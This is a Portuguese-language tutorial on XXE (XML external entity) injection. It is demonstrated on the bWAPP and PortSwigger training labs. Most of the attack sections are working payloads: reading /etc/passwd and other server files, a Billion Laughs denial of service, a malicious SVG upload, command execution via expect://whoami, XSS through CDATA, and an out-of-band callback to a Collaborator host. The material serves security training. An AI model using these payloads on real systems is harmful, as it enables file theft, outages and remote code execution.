# XML

XML (Extensible Markup Language) é uma linguagem de marcação normalmente utilizada para desenvolvimento web, é utilizanda no armazenamento e transporte de dados.
É uma linguagem auto descritiva, não existem tags predefinidas como `<p>`, `<img>` ou etc...
Todas as tags são definidas pelo usuário dependendo do dado que isso representa, um exemplo seria o seguinte:

```xml
<?xml
  version="version_number"
  encoding="encoding_declaration"
  standalone="standalone_status"
?>
```

**version**: É utilizada para especificar qual versão do XML está sendo utilizada, ex: "1.0";

**encoding**: É utilizada para declarar o encoding utilizado, o padrão é UTF-8, porém podem ser utilizados os seguintes:
`"UTF-8, UTF-16, ISO-10646-UCS-2, ISO-10646-UCS-4, Shift_JIS, ISO-2022-JP, ISO-8859-1 to ISO-8859-9 e EUC-JP"`

**standalone**: Informa ao parser se o documento tem link a uma fonte de dados externa ou tem alguma referencia a algum documento externo, o valor default é "no", os valores disponívels são "yes" e "no".

# Entidades

Em linguagens de programação nós temos variáveis e constantes, em XML nós temos Entity, são a maneira de representar dados presentes dentro do documento XML, existem várias entidades pré-existentes no XML, como:

&amp: & (Ê comercial);
&apos: ' (Apóstrofo);
&gt: > (Maior que);
&lt: < (Menor que);
&quot: " (Aspas);


A declaração de uma Entity externa usa a keyword SYSTEM e precisa declarar uma URL de onde a entity será carregada, exemplo:

```xml
<!ENTITY externalEntity SYSTEM "URL">
```

Nessa sintaxe `externalEntity` é o nome da entidade, `SYSTEM` é a keyword utilizada e `URL` é de onde iremos carregar nossa entidade externa.

# DTD (Document Type Definition)

É utilizado para declarar a estrutura do documento XML, tipos de dados, valores que eles podem conter e etc, DTD pode estar presente no arquivo XML ou declarado separadamente, é normalmente declarado no início do arquivo utilizando `<DOCTYPE>`
Existem vários tipos de DTD's, aqui estamos interessados nos DTD's externos.

```xml
<!DOCTYPE externalDTD SYSTEM "URL" [...] >
```

Da mesma maneira da Entity externa, a keyword `SYSTEM` será utilizada para especificar de onde o DTD será carregado no DTD `externalDTD`

# Ataque XXE

Esse ataque é efetuado contra uma aplicação no momento da análise do input de XML, se o parser tiver uma configuração vulnerável e processar algo indevido, poderemos injetar códigos da mesma maneira que uma falha XSS para obter informações privilegiadas.

Existem vários tipos de DTD's, mas o que estamos interessados são os externos, que existem dois tipos:

### System

Que nos permite especificar a localização do arquivo externo que contém a declaração do DTD.

<img src="https://i0.wp.com/1.bp.blogspot.com/-Zvx6Sfo3s-A/X7ZlUL60k3I/AAAAAAAAqy4/QSTW-ubiJCcUSwefj_u4UfRrVG_mVnj4wCLcBGAsYHQ/s16000/1.0.png?w=640&ssl=1"></img>

#### Impactos

XXE pode fornecer uma ameaça para a empresa, XXE sempre esteve na lista das vulnerabilidades mais comuns da OWASP e é comum que muitos sites utilizem XML nas strings e transporte de dados, se os devidos cuidados não forem tomados algumas informações poderão ser comprometidas.
Uma lista de ataques possíveis são:

- Server-Side Request Forgery
- DoS Attack
- Remote Code Execution
- Cross-Site Scripting

XXE Injection tem uma nota de 7.5 e uma criticidade média segundo o [CVSS score](https://nvd.nist.gov/vuln-metrics/cvss) 

# Utilizando XXE para efetuar SSRF (Server-side request forgery)

SSRF (Server-side request forgery) é uma vunerabilidade que o hacker injeta HTML no server side para obter controle do site ou para redirecionar o output para o servidor do atacante.

Os SSRF que existem são:

### Arquivo local

São arquivos que estão presentes no website, como robots.txt, phpinfo e mais...
Vamos utilizar [bWAPP](http://www.itsecgames.com/) da OWASP para efetuar os ataques XXE, vamos utilizar o level set em low.

No bWAPP no desafio de XXE precisamos interceptar com o BurpSuite quando botão `Any bugs?` for pressionado.

Irá gerar uma requisição post parao endpoint `xxe-2.php` com o seguinte payload:

```xml
<reset>
  <login>
  bee
  </login>
  <secret>
  Any bugs?
  </secret>
</reset>
```

E como podemos ver a requisição não é filtrada, então podemos mandar para o repeater do burpsuite e reajustar o payload para efetuarmos alguns testes.
Existem dois campos onde a vulnerabilidade pode estar, que são `login` e `secret`, enviando o payload default temos uma resposta `200` com a mensagem `bee's secret has been reset!`, ou seja, a referência que temos na mensagem é `bee` que seria o campo de `login`, vamos testá-lo.

Efetuando a chamada novamente com o payload da seguinte maneira:

```xml
<reset>
  <login>
  roz
  </login>
  <secret>
  Any bugs?
  </secret>
</reset>
```

A mensagem de retorno é: `roz's secret has been reset!`, isso deixa mais claro que o campo injetável é o `login`, vamos tentar efetuar o ataque no bugs.txt do próprio server, enviaremos o seguinte payload:

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE reset [
<!ENTITY roz SYSTEM "http://localhost/bWAPP/bugs.txt">
]>
<reset><login>&roz;</login><secret>Any bugs?</secret></reset>
```

No payload nomeamos a entidade de retorno do SYSTEM como `roz` e passando o arquivo bugs.txt para ela, sendo assim o retorno será:

```
/ A1 - Injection /,portal.php
HTML Injection - Reflected (GET),htmli_get.php
HTML Injection - Reflected (POST),htmli_post.php
HTML Injection - Reflected (Current URL),htmli_current_url.php
HTML Injection - Stored (Blog),htmli_stored.php
iFrame Injection, iframei.php
LDAP Injection (Search),ldapi.php
Mail Header Injection (SMTP),maili.php
OS Command Injection,commandi.php
OS Command Injection - Blind,commandi_blind.php
PHP Code Injection,phpi.php
Server-Side Includes (SSI) Injection,ssii.php
SQL Injection (GET/Search),sqli_1.php
SQL Injection (GET/Select),sqli_2.php
SQL Injection (POST/Search),sqli_6.php
SQL Injection (POST/Select),sqli_13.php
SQL Injection (AJAX/JSON/jQuery),sqli_10-1.php
SQL Injection (CAPTCHA),sqli_9.php
SQL Injection (Login Form/Hero),sqli_3.php
...'s secret has been reset!
```

Como podemos ver através do resultado, utilizando XXE conseguimos explorar um SSRF.

### Como funciona?

Quando injetamos o payload, ele é passado para o servidor que não possui filtros para mitigar XXE, sendo assim o servidor utiliza um parser e envia o output do XML parseado, que no nosso caso será o arquivo `bugs.txt` que será exposto ao atacante devido a query XML.

### Arquivo remoto

Nesse caso o atacante poderá utilizar scripts maliciosos hosteados remotamente com objetivo de obter acesso ou informações privilegiadas, vamos tentar obter o arquivo `/etc/passwd` do servidor alvo, o payload enviado será o seguinte:

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE reset [
<!ENTITY roz SYSTEM "file:///etc/passwd">
]><reset><login>&roz;</login><secret>Any bugs?</secret></reset>
```

E o retorno será:

```
root:x:0:0:root:/root:/usr/bin/bash
...'s secret has been reset!
```

### Ataque DOS XXE <i>Billion Laugh</i>

<i>Billion Laugh</i> é um tipo de ataque DOS que o alvo são os parsers de documentos XML, também é conhecido como XML bomb ou ataque de expansão exponencial de entidade.

O ataque consiste em chamar a entidade multiplas vezes, e isso leva tempo exponencial para executar, o que se torna um DoS attack derrubando o website.

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE reset [
  <!ENTITY roz "DoS">
  <!ENTITY roz1 "&roz;&roz;&roz;&roz;&roz;&roz;&roz;&roz;&roz;&roz;&roz;&roz;&roz;&roz;&roz;&roz;&roz;&roz;&roz;&roz;&roz;&roz;&roz;&roz;&roz;&roz;&roz;&roz;&roz;&roz;&roz;&roz;&roz;&roz;&roz;&roz;&roz;&roz;&roz;&roz;&roz;&roz;&roz;&roz;&roz;">
  <!ENTITY roz2 "&roz1;&roz1;&roz1;&roz1;&roz1;&roz1;&roz1;&roz1;&roz1;&roz1;&roz1;&roz1;&roz1;&roz1;&roz1;&roz1;&roz1;&roz1;&roz1;&roz1;&roz1;&roz1;&roz1;&roz1;&roz1;&roz1;&roz1;&roz1;&roz1;&roz1;&roz1;&roz1;&roz1;&roz1;&roz1;&roz1;&roz1;&roz1;">
  <!ENTITY roz3 "&roz2;&roz2;&roz2;&roz2;&roz2;&roz2;&roz2;&roz2;&roz2;&roz2;&roz2;&roz2;&roz2;&roz2;&roz2;&roz2;&roz2;&roz2;&roz2;&roz2;&roz2;&roz2;&roz2;&roz2;&roz2;&roz2;&roz2;&roz2;&roz2;&roz2;&roz2;&roz2;&roz2;&roz2;&roz2;&roz2;&roz2;&roz2;">
  <!ENTITY roz4 "&roz3;&roz3;&roz3;&roz3;&roz3;&roz3;&roz3;&roz3;&roz3;&roz3;&roz3;&roz3;&roz3;&roz3;&roz3;&roz3;&roz3;&roz3;&roz3;&roz3;&roz3;&roz3;&roz3;&roz3;&roz3;&roz3;&roz3;&roz3;&roz3;&roz3;&roz3;&roz3;&roz3;&roz3;&roz3;&roz3;&roz3;&roz3;">
  <!ENTITY roz5 "&roz4;&roz4;&roz4;&roz4;&roz4;&roz4;&roz4;&roz4;&roz4;&roz4;&roz4;&roz4;&roz4;&roz4;&roz4;&roz4;&roz4;&roz4;&roz4;&roz4;&roz4;&roz4;&roz4;&roz4;&roz4;&roz4;&roz4;&roz4;&roz4;&roz4;&roz4;&roz4;&roz4;&roz4;&roz4;&roz4;&roz4;&roz4;">
  <!ENTITY roz6 "&roz5;&roz5;&roz5;&roz5;&roz5;&roz5;&roz5;&roz5;&roz5;&roz5;&roz5;&roz5;&roz5;&roz5;&roz5;&roz5;&roz5;&roz5;&roz5;&roz5;&roz5;&roz5;&roz5;&roz5;&roz5;&roz5;&roz5;&roz5;&roz5;&roz5;&roz5;&roz5;&roz5;&roz5;&roz5;&roz5;&roz5;&roz5;">
  <!ENTITY roz7 "&roz6;&roz6;&roz6;&roz6;&roz6;&roz6;&roz6;&roz6;&roz6;&roz6;&roz6;&roz6;&roz6;&roz6;&roz6;&roz6;&roz6;&roz6;&roz6;&roz6;&roz6;&roz6;&roz6;&roz6;&roz6;&roz6;&roz6;&roz6;&roz6;&roz6;&roz6;&roz6;&roz6;&roz6;&roz6;&roz6;&roz6;&roz6;">
  <!ENTITY roz8 "&roz7;&roz7;&roz7;&roz7;&roz7;&roz7;&roz7;&roz7;&roz7;&roz7;&roz7;&roz7;&roz7;&roz7;&roz7;&roz7;&roz7;&roz7;&roz7;&roz7;&roz7;&roz7;&roz7;&roz7;&roz7;&roz7;&roz7;&roz7;&roz7;&roz7;&roz7;&roz7;&roz7;&roz7;&roz7;&roz7;&roz7;&roz7;">
]>

<reset><login>&roz8;</login><secret>Any bugs?</secret></reset>
```

O payload vai chamar `roz` várias vezes em crescimento exponencial formando uma cadeia de callbacks que irão sobrecarregar o servidor, como podemos ver no payload de reset utilizamos a entidade `roz8`, que chama várias vezes a `roz7`, que chama várias vezes a `roz6` e continua até nossa entidade portadora da string `DoS`

Quando enviamos o payload para `xxe-2.php`, não teremos nenhuma resposta, porém quando tentarmos acessar o <i>bWAPP</i>, veremos que ele terá caído.

### XXE Utilizando upload de arquivos

Na exploração de XXE por upload, podemos utilizar o laboratório do PortSwigger (criador do burpsuite) [Exploiting XXE via Image Upload](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload)

Vamos enviar nosso payload na sessão de comentários através de um `SVG` de avatar, o payload ficou o seguinte:

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE reset [
    <!ENTITY xxe SYSTEM "file:///etc/hostname">
] >
<svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="40" x="0" y = "100">&xxe;</text>
</svg>
```
Como já colocamos a sintaxe básica de uma imagem SVG dentro do payload, só precisamos mudar a extensão de XML para SVG:

`mv payload.xml payload.svg`

Quando upload for efetuado, vamos que que nosso avatar irá aparecer bem pequeno nos comentários, podemos clicar com o botão direito nele e ir em abrir imagem. 
Na imagem SVG estará o hostname do servidor qual teve o XML parseado com o comando `file:///etc/hostname`.

### XXE para execução remota de código

RCE é uma vulnerabilidade muito grave, podemos obter quase qualquer informação que o usuário da aplicação tenha permissão.

Supondo que o payload que enviamos seja o seguinte:

```xml
<?xml version="1.0" encoding="utf-8"?>
<root>
  <name>
    roz
  </name>
  <tel>
    40028922
  </tel>
  <email>
    test@protonmail.com
  </email>
  <password>
    ohnonononono
  </password>
</root>
```
Poderemos analisar a resposta, supondo que seja algo como

`test@protonmail.com is already registered, try to remember your password`

Podemos ver que o `<email>` é um campo interessante para podermos testar.

Vamos tentar ver o usuário da aplicação através de UM RCE no campo de `email`, vamos utilizar o payload da seguinte maneira:

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY roz SYSTEM "expect://whoami"> ]>
<root>
  <name>
    roz
  </name>
  <tel>
    40028922
  </tel>
  <email>
    &roz;
  </email>
  <password>
    ohnonononono
  </password>
</root>
```

Caso vulnerável o retorno será algo como:

`jarbas is already registered, try to remember your password` (Sim, jarbas é o usuário do servidor rodando a aplicação)

Então vimos que podemos executar códigos remotamente no servidor através de um XXE Injection.

### XSS via XXE

No caso de XSS poderemos utilizar [CDATA](https://en.wikipedia.org/wiki/CDATA) do XML para atacar, levando em conta o laboratório anterior poderemos utilizar o payload da seguinte maneira para executar códigos JS:

```xml
<?xml version="1.0" encoding="utf-8"?>
<root>
  <name>
    roz
  </name>
  <tel>
    40028922
  </tel>
  <email>
    <![CDATA[<]]>img src="" onerror=javascript:alert(1)<![CDATA[>]]>
  </email>
  <password>
    ohnonononono
  </password>
</root>
```

Na maioria dos campos de input os caracteres `<` e `>` são bloqueados, então conseguimso bypassar colocando eles no CDATA, devido a eles não serem parseados, apenas apresentados no output.

Caso esteja utilizando burpsuite podemos utilizar o "Show response in browser" e verificar se existe um alerta com o número 1, se sim então podemos efetuar ataques XSS por XXE.

### Utilizando JSON em ataques XXE

Em uma chamada POST, poderemos verificar o payload e ver os campos enviados, comumente são utilizados `JSON's` e o `Content-Type` é `application/json`, supondo que o payload enviado seja:

```json
{
  "text":"Is this vulnerable?"
}
```

Vamos tentar modificar o payload para XML, o `Content-Type` para `application/xml` e ver qual o resultado, ficaria da seguinte maneira:

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
  <!ENTITY roz SYSTEM "file:///">
]>
<comment>
  <text>
    &roz;
  </text>
</comment>
```

Caso o retorno sejam as pastas do diretório / do servidor nós conseguimos modificar o payload e enviar executando comandos.

### Blind XXE

Nos ataques anteriores nós conseguimos definir qual campo estava vulnerável, mas qual existe um retorno diferente do nosso input? Podemos utilizar Blind XXE, vamos utilizar outro lab do PortSwigger para exemplificar esse caso, o lab é o [Blind XXE with out-of-band interaction via XML parameter Entities](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities).

Entrando na página de detalhes de qualquer produto, podemos ver que existe um botão `check stock`, vamos interceptá-lo e ver o payload.

```xml
<?xml version="1.0" encoding="utf-8"?>
<stockCheck>
  <productId>
    1
  </productId>
  <storeId>
    1
  </storeId>
</stockCheck>
```

Até então tudo bem, poré o retorno é apenas o número `764` que é a quantidade unidades do produto que pedimos para verificar no estoque.

Sendo assim, vamos utilizar o Burp Collaborator do BurpSuite para nos ajudar, vamos abrí-lo e copiar o subdomain que estará o nosso payload:

<img src="https://i0.wp.com/1.bp.blogspot.com/--UFf1T4wn14/X7ueSPZjLnI/AAAAAAAArEE/J-QZ44ShTpAosA2dR11gtTe6fMcKZb37QCLcBGAsYHQ/s16000/11.png?w=640&ssl=1"></img>

Ficará da seguinte maneira:

```xml
<!DOCTYPE stockCheck [
<!ENTITY % roz SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net"> %roz; ]>
```

Sendo assim, tentaremos enviar através do `<productId>`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<stockCheck>
  <productId>
    <!DOCTYPE stockCheck [
    <!ENTITY % roz SYSTEM "http://hackerman.burpcollaborator.net"> %roz; ]>
  </productId>
  <storeId>
    1
  </storeId>
</stockCheck>
```

E podemos verificar nas interactions do Collaborator se existem interações, caso sim conseguimos 'explorar' o Blind XXE:

<img src="https://i0.wp.com/1.bp.blogspot.com/-1xpvwoYkuDk/X7ue7MF9TjI/AAAAAAAArEU/5BWHfYc5q0MLS9-ySEOAeIlIifmgeNWrgCLcBGAsYHQ/s16000/13.png?w=640&ssl=1"></img>


Misericórdia, quanta falha, deve ser horrível pra mitigar isso, né?
Não!

### Mitigação

Podemos simplesmente desabilitar DTDs (entidades externas) completamente.

Mas nunca estamos 100% seguros. :)
